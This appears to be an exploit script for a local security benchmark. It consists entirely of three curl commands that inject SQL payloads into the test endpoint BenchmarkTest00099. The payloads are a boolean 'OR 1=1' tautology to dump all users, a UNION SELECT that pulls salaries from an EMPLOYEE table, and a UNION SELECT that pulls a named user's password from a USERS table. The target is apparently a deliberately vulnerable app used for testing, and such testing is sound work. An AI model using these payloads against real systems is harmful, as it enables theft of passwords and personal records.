# Exploit SQL Injection on /benchmark/sqli-00/BenchmarkTest00099
# Payload 1: Boolean-based - extract all users
curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00099' \
  -d "BenchmarkTest00099=' OR '1'='1"

# Payload 2: UNION-based - extract salary from EMPLOYEE table
curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00099' \
  -d "BenchmarkTest00099=' UNION SELECT salary FROM EMPLOYEE WHERE '1'='1"

# Payload 3: Extract specific user's password
curl -X POST 'http://127.0.0.1:8443/benchmark/sqli-00/BenchmarkTest00099' \
  -d "BenchmarkTest00099=' UNION SELECT password FROM USERS WHERE username='foo' AND '1'='1"